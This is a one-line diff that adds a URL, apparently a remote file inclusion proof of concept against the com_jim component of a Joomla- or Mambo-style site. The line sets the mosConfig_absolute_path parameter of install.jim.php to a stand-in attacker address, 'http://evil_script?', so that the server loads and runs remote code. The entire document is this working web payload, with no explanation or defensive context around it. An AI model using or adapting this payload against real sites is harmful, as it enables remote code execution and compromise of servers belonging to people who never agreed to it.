@@ -1,0 +1,1 @@
+http://www.example.com/[path]/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=http://evil_script?
